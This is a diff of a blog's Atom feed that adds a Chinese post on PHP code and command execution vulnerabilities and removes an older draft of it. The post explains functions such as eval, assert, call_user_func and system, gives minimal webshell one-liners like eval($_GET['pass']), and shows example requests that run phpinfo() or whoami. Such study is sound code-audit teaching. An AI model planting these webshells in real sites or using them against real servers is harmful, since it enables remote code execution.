@@ -128,9 +128,9 @@
       <category term="随笔" scheme="http://yoursite.com/categories/%E9%9A%8F%E7%AC%94/"/>
     
     
-      <category term="web" scheme="http://yoursite.com/tags/web/"/>
-    
       <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
+    
+      <category term="web" scheme="http://yoursite.com/tags/web/"/>
     
   </entry>
   
@@ -221,6 +221,104 @@
       <category term="算法" scheme="http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"/>
     
       <category term="ACM" scheme="http://yoursite.com/tags/ACM/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>php代码/命令执行漏洞</title>
+    <link href="http://yoursite.com/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://yoursite.com/2017/08/08/php代码-命令执行漏洞/</id>
+    <published>2017-08-08T08:38:51.000Z</published>
+    <updated>2017-08-08T08:39:29.894Z</updated>
+    
+    <content type="html"><![CDATA[<p>php代码/命令执行漏洞<br><a id="more"></a></p>
+<h1 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h1><h2 id="php代码执行相关"><a href="#php代码执行相关" class="headerlink" title="php代码执行相关"></a>php代码执行相关</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed eval ( string $code )</div></pre></td></tr></table></figure>
+<p>把字符串<code>code</code>作为php代码执行。常见的一句话木马：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">eval</span>($_GET[<span class="string">'pass'</span>])</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://xxx/codeexec.php?pass=phpinfo();</div></pre></td></tr></table></figure></p>
+<p>得到phpinfo()页面。</p>
+<h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>PHP 5<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bool assert ( mixed $assertion [, string $description ] )</div></pre></td></tr></table></figure></p>
+<p>PHP 7<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bool assert ( mixed $assertion [, Throwable $exception ] )</div></pre></td></tr></table></figure></p>
+<p>assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的响应。如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</p>
+<p>一句话木马：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	assert($_GET[<span class="string">'pass'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://xxx/codeexec.php?pass=phpinfo()</div></pre></td></tr></table></figure></p>
+<p>phpinfo()后可以不用分号。得到phpinfo()页面。</p>
+<h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</div></pre></td></tr></table></figure>
+<p>搜索subject中匹配pattern的部分， 以replacement进行替换。当使用被弃用的 e 修饰符时, 这个函数会转义一些字符，在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串<br>更详细的说明见：<a href="http://php.net/preg_replace" target="_blank" rel="external">php-preg_replace</a></p>
+<h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )</div></pre></td></tr></table></figure>
+<p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 传入call_user_func()的参数不能为引用传递。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	call_user_func($_GET[<span class="string">'chybeta'</span>],$_GET[<span class="string">'ph0en1x'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x=phpinfo()</div></pre></td></tr></table></figure></p>
+<h3 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed call_user_func_array ( callable $callback , array $param_arr )</div></pre></td></tr></table></figure>
+<p>把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	call_user_func_array($_GET[<span class="string">'chybeta'</span>],$_GET[<span class="string">'ph0en1x'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x[]=phpinfo()</div></pre></td></tr></table></figure></p>
+<h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string create_function ( string $args , string $code )</div></pre></td></tr></table></figure>
+<p>该函数的内部实现用到了<code>eval</code>，所以也具有相同的安全问题。第一个参数<code>args</code>是后面定义函数的参数，第二个参数是函数的代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$a = $_GET[<span class="string">'chybeta'</span>];</div><div class="line">	$b = create_function(<span class="string">'$a'</span>,<span class="string">"echo $a"</span>);</div><div class="line">	$b(<span class="string">''</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/codeexec.php</div><div class="line">?chybeta=phpinfo();</div></pre></td></tr></table></figure></p>
+<h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">array array_map ( callable $callback , array $array1 [, array $... ] )</div></pre></td></tr></table></figure>
+<p>作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$array = <span class="keyword">array</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</div><div class="line">	array_map($_GET[<span class="string">'chybeta'</span>],$array);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/codeexec.php</div><div class="line">?chybeta=phpinfo</div></pre></td></tr></table></figure></p>
+<p>注意没有括号<code>()</code>和分号<code>;</code>。</p>
+<h2 id="系统命令执行相关"><a href="#系统命令执行相关" class="headerlink" title="系统命令执行相关"></a>系统命令执行相关</h2><h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string system ( string $command [, int &amp;$return_var ] )</div></pre></td></tr></table></figure>
+<p>command是要执行的命令。return_var，如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	system(<span class="string">"whoami"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>会看到运行了shell命令，并打印回显到页面上。</p>
+<h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">void passthru ( string $command [, int &amp;$return_var ] )</div></pre></td></tr></table></figure>
+<p>command是要执行的命令。return_var，如果提供 return_var 参数， Unix 命令的返回状态会被记录到此参数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	passthru(<span class="string">"whoami"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )</div></pre></td></tr></table></figure>
+<p>exec() 执行 command 参数所指定的命令。 其余参数，见<a href="http://php.net/manual/zh/function.exec.php" target="_blank" rel="external">文档</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">echo</span> exec(<span class="string">"whoami"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">void pcntl_exec ( string $path [, array $args [, array $envs ]] )</div></pre></td></tr></table></figure>
+<p>path是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本<br>args是一个要传递给程序的参数的字符串数组。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	pcntl_exec ( <span class="string">"/bin/bash"</span> , <span class="keyword">array</span>(<span class="string">"whoami"</span>));</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string shell_exec ( string $cmd )</div></pre></td></tr></table></figure>
+<p>cmd是要执行的命令。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">echo</span> shell_exec(<span class="string">"whoami"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">resource popen ( string $command , string $mode )</div></pre></td></tr></table></figure>
+<p>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。 后面的mode，当为 ‘r’，返回的文件指针等于命令的 STDOUT，当为 ‘w’，返回的文件指针等于命令的 STDIN。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$handle = popen(<span class="string">"/bin/ls"</span>, <span class="string">"r"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">resource proc_open ( string $cmd , array $descriptorspec , array &amp;$pipes [, string $cwd [, array $env [, array $other_options ]]] )</div></pre></td></tr></table></figure>
+<p>cmd是要执行的命令，其余见<a href="http://php.net/manual/zh/function.proc-open.php" target="_blank" rel="external">文档</a></p>
+<h3 id="反单引号"><a href="#反单引号" class="headerlink" title="`(反单引号)"></a>`(反单引号)</h3><p>在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数 shell_exec() 相同。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">echo</span> `whoami`;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start()"></a>ob_start()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bool ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )</div></pre></td></tr></table></figure>
+<p>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。</p>
+<p>可选参数 output_callback 函数可以被指定。 此函数把一个字符串当作参数并返回一个字符串。 当输出缓冲区被( ob_flush(), ob_clean() 或者相似的函数)冲刷（送出）或者被清洗的时候；或者在请求结束之际输出缓冲区内容被冲刷到浏览器的时候该函数将会被调用。 当调用 output_callback 时，它将收到输出缓冲区的内容作为参数 并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器。</p>
+<p>下面的代码，由于调用了ob_end_flush()，所以会调用ob_start($cmd)中的cmd，把我们输入的$_GET[a]作为cmd的参数。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$cmd = <span class="string">'system'</span>;</div><div class="line">	ob_start($cmd);</div><div class="line">	<span class="keyword">echo</span> <span class="string">"$_GET[a]"</span>;</div><div class="line">	ob_end_flush();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/codeexec.php?a=whoami</div></pre></td></tr></table></figure></p>
+<h1 id="php-mail"><a href="#php-mail" class="headerlink" title="php mail()"></a>php mail()</h1><p><a href="http://php.net/manual/zh/function.mail.php" target="_blank" rel="external">mail 文档</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">bool mail (</div><div class="line">	string $to ,</div><div class="line">	string $subject ,</div><div class="line">	string $message [,</div><div class="line">	string $additional_headers [,</div><div class="line">	string $additional_parameters ]]</div><div class="line">)</div></pre></td></tr></table></figure></p>
+<p>要使用mail()函数，需要配置对应的服务器等，在php.ini中有两个选项：</p>
+<ul>
+<li>配置SMTP服务器的主机名和端口</li>
+<li>配置PHP用作邮件传输代理（MTA）的文件路径</li>
+</ul>
+<p>当PHP配置了第二个选项时，对该mail()函数的调用将导致执行配置对MTA程序。虽然PHP内部使用escapeshellcmd()用于程序调用，防止新的shell命令注入，但第5个参数$additional_parameters中mail()允许添加的新程序。因此，攻击者可以附加程序标志，在某些MTA中可以创建具有用户控制内容的文件。</p>
+<p>实例：<a href="http://blog.nsfocus.net/tag/php-mail%E5%87%BD%E6%95%B0%E5%BC%95%E5%8F%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">多个PHP mail函数引发的命令执行漏洞分析</a></p>
+<p>参考：<a href="http://www.91ri.org/17039.html" target="_blank" rel="external">为什么mail()函数在PHP中是危险的</a></p>
+<h1 id="反序列化问题"><a href="#反序列化问题" class="headerlink" title="反序列化问题"></a>反序列化问题</h1><p>见：<a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">浅谈php反序列化漏洞 </a></p>
+<h1 id="LD-PRELOAD绕过"><a href="#LD-PRELOAD绕过" class="headerlink" title="LD_PRELOAD绕过"></a>LD_PRELOAD绕过</h1><p>实例：<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=25351&amp;extra=page%3D1%26filter%3Dtypeid%26typeid%3D146" target="_blank" rel="external">第十届全国大学生信息安全技能赛PHP execise</a><br>参考: <a href="http://wooyun.jozxing.cc/static/drops/tips-16054.html" target="_blank" rel="external">利用环境变量LD_PRELOAD来绕过php disable_function执行系统命令</a></p>
+<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
+<li><a href="http://php-security.org/2010/05/20/mops-submission-07-our-dynamic-php/index.html" target="_blank" rel="external">Obvious and not so obvious PHP code injection and evaluation</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;php代码/命令执行漏洞&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
+    
+    
+      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="php" scheme="http://yoursite.com/tags/php/"/>
+    
+      <category term="代码执行" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
     
   </entry>
   
@@ -801,66 +899,6 @@
       <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
     
       <category term="re" scheme="http://yoursite.com/tags/re/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>php代码执行漏洞</title>
-    <link href="http://yoursite.com/2017/07/26/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
-    <id>http://yoursite.com/2017/07/26/php代码执行漏洞/</id>
-    <published>2017-07-26T07:49:44.000Z</published>
-    <updated>2017-07-28T08:19:28.113Z</updated>
-    
-    <content type="html"><![CDATA[<p>php代码执行漏洞<br><a id="more"></a></p>
-<h1 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h1><h2 id="php代码执行相关"><a href="#php代码执行相关" class="headerlink" title="php代码执行相关"></a>php代码执行相关</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed eval ( string $code )</div></pre></td></tr></table></figure>
-<p>把字符串<code>code</code>作为php代码执行。常见的一句话木马：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">eval</span>($_GET[<span class="string">'pass'</span>])</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://xxx/codeexec.php?pass=phpinfo();</div></pre></td></tr></table></figure></p>
-<p>得到phpinfo()页面。</p>
-<h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>PHP 5<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bool assert ( mixed $assertion [, string $description ] )</div></pre></td></tr></table></figure></p>
-<p>PHP 7<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bool assert ( mixed $assertion [, Throwable $exception ] )</div></pre></td></tr></table></figure></p>
-<p>assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的响应。如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</p>
-<p>一句话木马：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	assert($_GET[<span class="string">'pass'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://xxx/codeexec.php?pass=phpinfo()</div></pre></td></tr></table></figure></p>
-<p>phpinfo()后可以不用分号。得到phpinfo()页面。</p>
-<h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</div></pre></td></tr></table></figure>
-<p>搜索subject中匹配pattern的部分， 以replacement进行替换。当使用被弃用的 e 修饰符时, 这个函数会转义一些字符，在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串<br>更详细的说明见：<a href="http://php.net/preg_replace" target="_blank" rel="external">php-preg_replace</a></p>
-<h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )</div></pre></td></tr></table></figure>
-<p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 传入call_user_func()的参数不能为引用传递。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	call_user_func($_GET[<span class="string">'chybeta'</span>],$_GET[<span class="string">'ph0en1x'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x=phpinfo()</div></pre></td></tr></table></figure></p>
-<h3 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed call_user_func_array ( callable $callback , array $param_arr )</div></pre></td></tr></table></figure>
-<p>把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	call_user_func_array($_GET[<span class="string">'chybeta'</span>],$_GET[<span class="string">'ph0en1x'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x[]=phpinfo()</div></pre></td></tr></table></figure></p>
-<h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string create_function ( string $args , string $code )</div></pre></td></tr></table></figure>
-<p>该函数的内部实现用到了<code>eval</code>，所以也具有相同的安全问题。第一个参数<code>args</code>是后面定义函数的参数，第二个参数是函数的代码。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$a = $_GET[<span class="string">'chybeta'</span>];</div><div class="line">	$b = create_function(<span class="string">'$a'</span>,<span class="string">"echo $a"</span>);</div><div class="line">	$b(<span class="string">''</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/codeexec.php</div><div class="line">?chybeta=phpinfo();</div></pre></td></tr></table></figure></p>
-<h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">array array_map ( callable $callback , array $array1 [, array $... ] )</div></pre></td></tr></table></figure>
-<p>作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$array = <span class="keyword">array</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</div><div class="line">	array_map($_GET[<span class="string">'chybeta'</span>],$array);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/codeexec.php</div><div class="line">?chybeta=phpinfo</div></pre></td></tr></table></figure></p>
-<p>注意没有括号<code>()</code>和分号<code>;</code>。</p>
-<h2 id="系统命令执行相关"><a href="#系统命令执行相关" class="headerlink" title="系统命令执行相关"></a>系统命令执行相关</h2><h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h3><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><h3 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h3><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h3><h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h3><h3 id="反单引号"><a href="#反单引号" class="headerlink" title="`(反单引号)"></a>`(反单引号)</h3><h3 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start()"></a>ob_start()</h3><h3 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd()"></a>escapeshellcmd()</h3><p>该函数用于过滤</p>
-<h1 id="php-mail"><a href="#php-mail" class="headerlink" title="php mail()"></a>php mail()</h1><h1 id="动态函数调用"><a href="#动态函数调用" class="headerlink" title="动态函数调用"></a>动态函数调用</h1><h1 id="反序列化问题"><a href="#反序列化问题" class="headerlink" title="反序列化问题"></a>反序列化问题</h1><h1 id="LD-PRELOAD绕过"><a href="#LD-PRELOAD绕过" class="headerlink" title="LD_PRELOAD绕过"></a>LD_PRELOAD绕过</h1><h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
-<li><a href="http://php-security.org/2010/05/20/mops-submission-07-our-dynamic-php/index.html" target="_blank" rel="external">Obvious and not so obvious PHP code injection and evaluation</a></li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;php代码执行漏洞&lt;br&gt;
-    
-    </summary>
-    
